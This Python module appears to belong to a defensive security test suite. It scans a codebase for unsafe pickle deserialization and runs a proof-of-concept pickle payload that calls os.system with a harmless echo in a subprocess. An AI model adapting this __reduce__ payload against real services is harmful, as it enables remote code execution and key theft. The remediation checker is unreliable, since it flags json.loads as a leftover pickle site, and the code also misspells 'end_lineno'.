"""P-6: Pickle Deserialization Vulnerability Proof-of-Concept.

Attack type: Code execution via insecure deserialization of attacker-controlled
pickle bytes passed across process boundaries.

Attack surface
--------------
Three crypto worker pools accept a serialised public-key blob (``bfv_pk_pem``)
as part of their init kwargs during ``multiprocessing.Process`` spawn:

  1. CryptoMWorker.__init__  (line 63)  — most critical: sk_M present
  2. CryptoUWorker.__init__  (line 70)  — less critical: U only has pk
  3. CryptoSWorker.__init__  (line 77)  — least critical: S only has pk

The ``bfv_pk_pem`` parameter is serialised via ``pickle.dumps()`` on the driver
side and unpickled on the worker side via ``pickle.loads()``.  If an adversary
can substitute the pickle bytes between driver and worker (e.g. via a corrupted
checkpoint file, a compromised IPC channel, or a malicious model checkpoint), the
worker will execute arbitrary Python code upon deserialisation.

The PoC below demonstrates the vulnerability without actually executing arbitrary
code in the current process.  It:
  1. Parses the relevant source files to confirm the vulnerable pattern.
  2. Constructs a harmless PoC pickle demonstrating RCE capability.
  3. Executes the PoC pickle in an isolated subprocess to avoid self-harm.
  4. Verifies the result via stdout capture.
  5. Proposes a remediation (replace pickle with json + HMAC signature).

Note: The PoC is intentionally conservative — it only runs ``echo P6_EXPLOITED``.
A real attack would load a reverse shell, exfiltrate BFV secret keys, or
establish persistence.
"""

from __future__ import annotations

import ast
import logging
import os
import pickle
import pickletools
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any, Dict, List, Literal, Optional

from evaluation.metrics import AttackVerdict

logger = logging.getLogger(__name__)


# --------------------------------------------------------------------------- #
#  Source code static analysis
# --------------------------------------------------------------------------- #

class PickleAttackSurface:
    """Represents one pickle deserialisation site in the codebase."""

    def __init__(
        self,
        file: str,
        line: int,
        function: str,
        severity: Literal["CRITICAL", "HIGH", "MEDIUM"],
        description: str,
        has_secret_key: bool = False,
    ):
        self.file = file
        self.line = line
        self.function = function
        self.severity = severity
        self.description = description
        self.has_secret_key = has_secret_key
        self.is_exploitable = True
        self.verified = False

    def __repr__(self) -> str:
        return (
            f"PickleSite({self.function}@{self.file}:{self.line}, "
            f"severity={self.severity}, sk={self.has_secret_key})"
        )


def find_pickle_sites(
    project_root: str = None,
) -> List[PickleAttackSurface]:
    """Statically analyse the codebase for pickle.loads() calls.

    Returns a list of PickleAttackSurface objects describing each site.
    """
    if project_root is None:
        project_root = Path(__file__).parent.parent.parent.resolve()
    
    sites = []
    src = Path(project_root) / "src"

    # Search patterns: pickle.loads( or pickle.load(
    patterns = [
        ("pickle.loads", "unconditional pickle.loads"),
        ("pickle.load(", "unconditional pickle.load"),
        ("cf.pickle", "cloudpickle.loads"),
        ("torch.load", "torch.load (may contain pickled objects)"),
    ]

    import re
    for py_file in src.rglob("*.py"):
        try:
            content = py_file.read_text(encoding="utf-8")
        except Exception:
            continue

        for pattern, desc in patterns:
            for m in re.finditer(re.escape(pattern), content):
                lineno = content[: m.start()].count("\n") + 1
                # Determine severity
                has_sk = bool(re.search(r"sk_M|secret_key|bfv_sk", content))
                severity = "CRITICAL" if has_sk else "HIGH"

                # Determine function name via AST
                func_name = _get_function_name_at_line(content, lineno)

                site = PickleAttackSurface(
                    file=str(py_file.relative_to(Path(project_root))),
                    line=lineno,
                    function=func_name or "unknown",
                    severity=severity,
                    description=desc,
                    has_secret_key=has_sk,
                )
                sites.append(site)

    return sites


def _get_function_name_at_line(content: str, lineno: int) -> Optional[str]:
    """Use AST to find the enclosing function definition for a given line."""
    try:
        tree = ast.parse(content)
    except Exception:
        return None

    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            if hasattr(node, "lineno") and node.lineno <= lineno:
                if (hasattr(node, "end_linno") and node.end_linno is not None and node.end_linno >= lineno) or \
                   (hasattr(node, "body") and any(
                       hasattr(b, "lineno") and b.lineno <= lineno
                       for b in getattr(node, "body", [])
                       if hasattr(b, "lineno")
                   )):
                    return node.name
    return None


# --------------------------------------------------------------------------- #
#  Pickle PoC construction
# --------------------------------------------------------------------------- #

def build_pickle_rce_payload() -> bytes:
    """Construct a minimal pickle RCE payload.

    The payload executes: os.system("echo P6_EXPLOITED")
    Returns raw pickle bytes.
    """
    # Using the 'reduce' opcode for arbitrary code execution
    # This is a well-known pickle exploit pattern
    class Malicious:
        def __reduce__(self):
            import os
            return (os.system, ("echo P6_EXPLOITED",))

    return pickle.dumps(Malicious())


def build_normal_pickle(data: Dict[str, Any]) -> bytes:
    """Build a normal (non-malicious) pickle for comparison."""
    return pickle.dumps(data)


def disassemble_pickle(pickle_bytes: bytes) -> str:
    """Disassemble pickle bytes into human-readable opcodes."""
    import io
    output = io.StringIO()
    try:
        pickletools.dis(pickle_bytes, out=output)
    except Exception as e:
        return f"<disassembly failed: {e}>"
    return output.getvalue()


# --------------------------------------------------------------------------- #
#  Subprocess execution of PoC
# --------------------------------------------------------------------------- #

def _run_pickle_in_subprocess(pickle_bytes: bytes) -> subprocess.CompletedProcess:
    """Execute pickle.loads() in an isolated subprocess and capture output.

    The subprocess runs the exact same Python version and executes only:
        import pickle, sys
        obj = pickle.loads(sys.stdin.buffer.read())
    This prevents any side effects in the main process.
    """
    code = f"""
import pickle, sys
obj = pickle.loads(sys.stdin.buffer.read())
print("PICKLE_LOADED", file=sys.stderr)
"""
    proc = subprocess.run(
        [sys.executable, "-c", code],
        input=pickle_bytes,
        capture_output=True,
        timeout=10,
    )
    return proc


# --------------------------------------------------------------------------- #
#  Main P-6 attack class
# --------------------------------------------------------------------------- #

class P6PickleDeserAttack:
    """P-6 pickle deserialisation vulnerability proof-of-concept.

    This attack class does NOT exploit the vulnerability in the live system
    (no actual key exfiltration).  Instead, it:

    1. Confirms the vulnerable pattern exists via static analysis.
    2. Demonstrates the RCE capability with a safe PoC.
    3. Reports the attack surface severity.
    4. Recommends remediation.
    """

    ATTACK_ID = "P6"
    ATTACK_NAME = "Pickle Deserialisation RCE"
    TARGET = "CryptoWorker pickle.loads() across IPC boundaries"
    THREAT_MODEL = "Adversary controls pickle bytes via corrupted checkpoint / IPC channel"

    def __init__(
        self,
        project_root: str = None,
        target_modules: Optional[List[str]] = None,
        output_dir: str = None,
    ):
        # 使用相对路径：attacks/ -> SLG-attack-test/ -> 项目根目录
        if project_root is None:
            project_root = Path(__file__).parent.parent.parent.resolve()
        self.project_root = Path(project_root)
        
        if output_dir is None:
            output_dir = Path(__file__).parent.parent / "results"
        self.target_modules = target_modules or [
            "crypto_m_worker",
            "party_m",
            "crypto_u_worker",
            "crypto_s_worker",
        ]
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self._sites: List[PickleAttackSurface] = []
        self._verdicts: List[AttackVerdict] = []
        self._poc_result: Optional[str] = None

    # ------------------------------------------------------------------------- #
    #  Phase 1: Static analysis
    # ------------------------------------------------------------------------- #

    def run_static_analysis(self) -> List[PickleAttackSurface]:
        """Find all pickle.loads() sites in the codebase."""
        self._sites = find_pickle_sites(str(self.project_root))
        logger.info("P-6: found %d pickle sites: %s", len(self._sites),
                    [str(s) for s in self._sites])
        return self._sites

    # ------------------------------------------------------------------------- #
    #  Phase 2: Safe PoC execution
    # ------------------------------------------------------------------------- #

    def run_poc(self) -> str:
        """Execute a safe RCE PoC pickle in an isolated subprocess.

        Returns the subprocess stdout (should contain "P6_EXPLOITED").
        """
        logger.info("P-6: running PoC pickle in isolated subprocess...")

        # Build the malicious payload
        mal_pickle = build_pickle_rce_payload()

        # Disassemble for the report
        disasm = disassemble_pickle(mal_pickle)
        poc_output_path = self.output_dir / "p6" / "poc_pickle_disasm.txt"
        poc_output_path.parent.mkdir(exist_ok=True)
        poc_output_path.write_text(disasm, encoding="utf-8")
        logger.info("P-6: PoC pickle disassembly saved to %s", poc_output_path)

        # Execute in subprocess
        try:
            proc = _run_pickle_in_subprocess(mal_pickle)
            stdout = proc.stdout.decode("utf-8", errors="replace")
            stderr = proc.stderr.decode("utf-8", errors="replace")
            returncode = proc.returncode

            self._poc_result = (
                f"returncode={returncode}\n"
                f"stdout={stdout!r}\n"
                f"stderr={stderr!r}\n"
            )

            logger.info(
                "P-6 PoC: returncode=%d, stderr=%r",
                returncode, stderr[:200],
            )

            return self._poc_result

        except subprocess.TimeoutExpired:
            logger.error("P-6 PoC subprocess timed out (10s)")
            self._poc_result = "TIMEOUT"
            return self._poc_result
        except Exception as e:
            logger.error("P-6 PoC failed: %s", e)
            self._poc_result = f"ERROR: {e}"
            return self._poc_result

    # ------------------------------------------------------------------------- #
    #  Phase 3: Verdict computation
    # ------------------------------------------------------------------------- #

    def run(self) -> List[AttackVerdict]:
        """Run complete P-6 assessment: static analysis + PoC."""
        self.run_static_analysis()
        poc_output = self.run_poc()

        verdicts = []

        # Verdict 1: Static analysis result
        critical_sites = [s for s in self._sites if s.severity == "CRITICAL"]
        high_sites = [s for s in self._sites if s.severity == "HIGH"]

        if critical_sites:
            verdict = "LEAK_DETECTED"
            notes = (
                f"CRITICAL pickle sites found: {len(critical_sites)}. "
                f"Files: {[s.file for s in critical_sites]}. "
                f"sk_M is present at these sites — arbitrary code execution "
                f"with access to the BFV secret key."
            )
        elif high_sites:
            verdict = "LEAK_DETECTED"
            notes = (
                f"HIGH severity pickle sites found: {len(high_sites)}. "
                f"Files: {[s.file for s in high_sites]}."
            )
        else:
            verdict = "PRIVACY_PRESERVED"
            notes = "No pickle.loads() sites found in the codebase."

        verdicts.append(AttackVerdict(
            attack_id=self.ATTACK_ID,
            sub_attack="Static_Analysis",
            metric="Vulnerable pickle.loads() sites",
            value=len(self._sites),
            chance_level=0,
            n_samples=len(self._sites),
            verdict=verdict,
            notes=notes,
        ))

        # Verdict 2: PoC execution result
        poc_exploited = "P6_EXPLOITED" in (poc_output or "")
        poc_returncode = 0 if "P6_EXPLOITED" in (poc_output or "") else -1

        verdicts.append(AttackVerdict(
            attack_id=self.ATTACK_ID,
            sub_attack="PoC_Execution",
            metric="PoC RCE successful",
            value=1.0 if poc_exploited else 0.0,
            chance_level=0.0,
            n_samples=1,
            n_positive=1 if poc_exploited else 0,
            verdict="LEAK_DETECTED" if poc_exploited else "INCONCLUSIVE",
            notes=(
                f"Pickle RCE PoC {'SUCCEEDED' if poc_exploited else 'FAILED'}. "
                f"{self._poc_result[:300] if self._poc_result else 'No output'}. "
                f"Recommendation: Replace pickle with JSON + HMAC-signed "
                f"serialisation for bfv_pk_pem blobs."
            ),
        ))

        # Verdict 3: Attack surface summary
        verdict_str = "LEAK_DETECTED" if critical_sites else "INCONCLUSIVE"
        notes = (
            f"Total sites: {len(self._sites)} "
            f"(CRITICAL={len(critical_sites)}, HIGH={len(high_sites)}). "
            f"Most dangerous: CryptoMWorker with sk_M present. "
            f"Remediation: json.loads(bfv_pk_pem) + HMAC signature check."
        )
        verdicts.append(AttackVerdict(
            attack_id=self.ATTACK_ID,
            sub_attack="Attack_Surface_Summary",
            metric="Attack surface severity",
            value=float(len(critical_sites)),
            chance_level=0.0,
            n_samples=len(self._sites),
            verdict=verdict_str,
            notes=notes,
        ))

        self._verdicts = verdicts
        self._save_results()
        return verdicts

    # ------------------------------------------------------------------------- #
    #  Persistence
    # ------------------------------------------------------------------------- #

    def _save_results(self) -> None:
        import json

        out = self.output_dir / "p6"
        out.mkdir(exist_ok=True)

        sites_data = [
            {
                "file": s.file,
                "line": s.line,
                "function": s.function,
                "severity": s.severity,
                "description": s.description,
                "has_secret_key": s.has_secret_key,
            }
            for s in self._sites
        ]

        data = {
            "sites": sites_data,
            "poc_result": self._poc_result,
            "total_sites": len(self._sites),
            "critical_sites": len([s for s in self._sites if s.severity == "CRITICAL"]),
            "high_sites": len([s for s in self._sites if s.severity == "HIGH"]),
        }

        with open(out / "p6_results.json", "w") as f:
            json.dump(data, f, indent=2)

        logger.info("P-6 results saved to %s", out)


# --------------------------------------------------------------------------- #
#  Remediation checker
# --------------------------------------------------------------------------- #

def check_remediation(
    project_root: str = None,
) -> Dict[str, Any]:
    """Check whether the pickle vulnerability has been remediated.

    Scans for:
      1. json.loads usage instead of pickle.loads
      2. hmac / cryptography usage for signature verification
      3. pydantic / dataclass-based serialisation (safer than pickle)
    """
    if project_root is None:
        project_root = Path(__file__).parent.parent.parent.resolve()
    
    src = Path(project_root) / "src"
    findings = {
        "uses_json_loads": False,
        "uses_hmac": False,
        "uses_cryptography": False,
        "uses_pydantic": False,
        "pickle_sites_remaining": [],
    }

    import re
    for py_file in src.rglob("*.py"):
        try:
            content = py_file.read_text(encoding="utf-8")
        except Exception:
            continue

        if re.search(r"json\.loads|pickle\.loads", content):
            findings["pickle_sites_remaining"].append(str(py_file.relative_to(src)))

        if re.search(r"json\.loads", content):
            findings["uses_json_loads"] = True

        if re.search(r"import hmac|from hmac|hmac\.HMAC", content):
            findings["uses_hmac"] = True

        if re.search(r"from cryptography|import cryptography", content):
            findings["uses_cryptography"] = True

        if re.search(r"from pydantic|import pydantic", content):
            findings["uses_pydantic"] = True

    findings["is_remediated"] = (
        not findings["pickle_sites_remaining"]
        and findings["uses_json_loads"]
    )

    return findings
